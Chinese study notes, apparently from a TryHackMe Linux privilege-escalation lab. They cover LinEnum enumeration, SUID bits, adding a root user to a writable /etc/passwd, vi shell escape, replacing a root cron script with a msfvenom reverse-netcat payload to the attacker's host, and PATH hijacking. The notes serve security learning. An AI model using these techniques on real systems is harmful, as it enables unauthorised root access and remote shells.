---
{"dg-publish":true,"title":"Common LINUX提权","dg-path":"THM/Common LINUX提权.md","permalink":"/THM/Common LINUX提权/","dgPassFrontmatter":true}
---

# 两种提权类别
+ **水平权限提升**(**Horizontal privilege escalation**)
	+ 获得同权限级别用户的权限
+ **垂直权限提升**(**Vertical privilege escalation**)
	+ 获得更高权限
+ ![Pasted image 20240205153415.png](/img/user/picture/Pasted%20image%2020240205153415.png)
# LinEnum
## 介绍
bash 脚本，它执行与权限提升相关的常见命令
[download](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
## 目标计算机上获取 LinEnum
+ 转到存储 LinEnum 本地副本的目录，
+ 并使用 “python3 -m http.server 8000”  启动 Python Web 服务器。
	+ ![Pasted image 20240205153956.png](/img/user/picture/Pasted%20image%2020240205153956.png)
+ 在目标计算机上使用“wget”和本地 IP，您可以从本地计算机中获取文件
	+ ![Pasted image 20240205154017.png](/img/user/picture/Pasted%20image%2020240205154017.png)
+ 然后使用命令“chmod +x FILENAME.sh”使文件可执行。


**其他方法**
+ 从本地计算机复制原始 LinEnum 代码
	+ ![Pasted image 20240205154159.png](/img/user/picture/Pasted%20image%2020240205154159.png)
+ 使用 Vi 或 Nano将其粘贴到目标上的新文件中
	+ ![Pasted image 20240205154218.png](/img/user/picture/Pasted%20image%2020240205154218.png)
+ 使用“.sh”扩展名保存文件
+ 使用命令“chmod +x FILENAME.sh”使文件可执行

## 运行LinEnum
+ LinEnum 的运行方式与运行任何 bash 脚本的方式相同
	+ 转到 LinEnum 所在的目录
	+ 运行命令“./LinEnum.sh”。
## 输出内容
+ Kernel
	+ 显示内核信息
+ Can we read/write sensitive files:
	+ 显示全局可写文件(任何经过身份验证的用户都可以读取和写入的文件)
+ SUID Files
	+ 显示 SUID 文件
	+ 它允许文件以所有者的权限运行
	+ 如果这是 root，则它以 root 权限运行。它可以允许我们升级权限。
+ _Crontab_ Contents
	+ 显示计划的cron jobs

# SUID/GUID文件
## 什么是SUID文件
在 Linux 中，**一切都是一个文件**，包括有权允许或限制三个操作（即读/写/执行）的目录和设备。

+ 最大权限(rwx-rwx-rwx)
	+ r = read = 读取
	+ w = write = 写入
	+ x = execute = 执行
	+ **user**     **group**     **others**
+ ![Pasted image 20240205162302.png](/img/user/picture/Pasted%20image%2020240205162302.png)
+ 每个用户最大可以设置权限的位数为 7，是读 （4）、写 （2） 和执行 （1） 操作的组合
	+ 如果使用“chmod”将权限设置为 755，则它将是：rwxr-xr-x。



在Linux系统中，SUID（Set User ID）和SGID（Set Group ID）是特殊的权限设置，它们允许用户在执行某个程序时，拥有该程序拥有者（对于SUID）或该程序所属组（对于SGID）的权限。

当给每个用户特别权限时，它变成了SUID或SGID。当给用户（拥有者）设置额外的“4”位时，它变成了SUID（设置用户ID）；当给组设置“2”位时，它变成了SGID（设置组ID）。

因此，当寻找SUID权限时，要查找的权限是：

SUID：

rws-rwx-rwx

这里，“rws”表示拥有者（用户）有读、写和执行权限，且SUID位被设置。SUID位的设置使得任何执行这个文件的用户都会临时获得文件所有者的权限。

SGID：

rwx-rws-rwx

这里，“rws”在组权限的位置，表示组成员有读、写和执行权限，且SGID位被设置。SGID位的设置使得执行该文件的用户都会临时获得文件所属组的权限。

简单来说，SUID和SGID是Linux中用于提升执行文件时用户或组权限的特殊权限位。


# /etc/passwd
## 概述
+ 是一个纯文本文件
+ 是列表的形式
+ 储存用户信息
	+ 用户ID
	+ 组ID
	+ 用户目录
	+ 用户shell
+ 通常权限
	+ 都有读取权限
	+ **只有root有写入权限**

## 格式
+ 一行表示一个用户
+ 一行有七个字段，用冒号`:`分隔
	+ test:x:0:0:root:/root:/bin/bash
	+ 1.  用户名
	+ 2. 密码。当为x的时候，表示密码储存在/etc/shadow 文件中
	+ 3.用户ID。UID 0 是root；UID 1-99 其他账户；UID 100-999 管理和系统 帐户/组；
	+ 4.组ID。组的文件在/etc/group
	+ 5.用户ID信息。相当于注释，可以加上电话，地址之类信息
	+ 6.主目录。用户登陆时所在的目录，如果目录不存在，则在根目录/
	+ shell路径。通常是一个shell，但是他也不一定是一个shell
## 利用
+ 前提：有写入的权限
+ 可以按照格式写入一行，创建一个root用户
+ 我们添加我们选择的密码哈希，并将 UID、GID 和 shell 设置为 root。
	+ 创建合规的hash密码
		+ **"openssl passwd -1 -salt \<salt\> \<password\> "**
		+ 例：salt -> new         password -> 123
		+ `openssl passwd -1 -salt new 123`
	+ new:\$1\$new\$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash

# Vi逃逸
## 过程
+ 前提：可以以root身份打开vi
+ `sudo vi`运行vi
+ 输入`:!sh`打开一个shell
## sudo -l
**列出可以以root身份运行的命令**

## GTFOBins
[URI](https://gtfobins.github.io/)

# 利用Crontab
+ Cron是一个长时间运行的进程 在特定日期和时间执行命令。

## 查看cronjobs
**`cat /etc/crontab`**

## 格式
+ 列表形式
+ 表头
	+ \#： 任务的ID序号
	+ m：分钟；h：小时
	+ dom：月份中的某一天；mon：月份；dow：星期几
	+ user：命令运行身份
	+ command：运行什么命令
+ 例:`17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly`

## 利用
+ 前提：
	+ 存在以root权限运行的进程
		+ 这里以autoscript.sh为例，每5分钟运行
	+ 有权限修改这个程序
+ 过程
	+ 在主机上创建反向连接的负载
		+ `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`
	+ 将负载写入程序
		+ `echo [MSFVENOM OUTPUT] > autoscript.sh`
		+ ![Pasted image 20240205173928.png](/img/user/picture/Pasted%20image%2020240205173928.png)
	+ 监听

# 利用PATH漏洞
## PATH概述
+ path是一种环境变量，用于指定保存可执行程序的目录
+ 当用户在终端中运行任何命令时，它会借助 PATH 变量搜索可执行文件来响应用户执行的命令
+ 查看用户相关的路径：`echo $PATH`

## 漏洞利用：
+ 如果有root权限的SUID文件调用shell来运行可执行文件时
+ 我们可以将 PATH 变量重写到我们选择的位置

## 例
+ 现在有文件script，运行文件会执行ls
+ 在/tmp中创造可执行文件ls
	+ `echo “[我们想要运行的任何命令]” > [我们正在模仿的可执行文件的名称]`
		+ `echo "/bin/bash" > ls`
	+ 将文件变成可执行的
		+ `chmod +x ls`
+ 更改PATH变量
	+ `export PATH=/tmp:$PATH`
	+ 注意：这将导致每次使用ls时都会打开一个bash
		+ 在完成前要使用ls，在/bin/ls中
		+ 完成后，`export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH`恢复默认


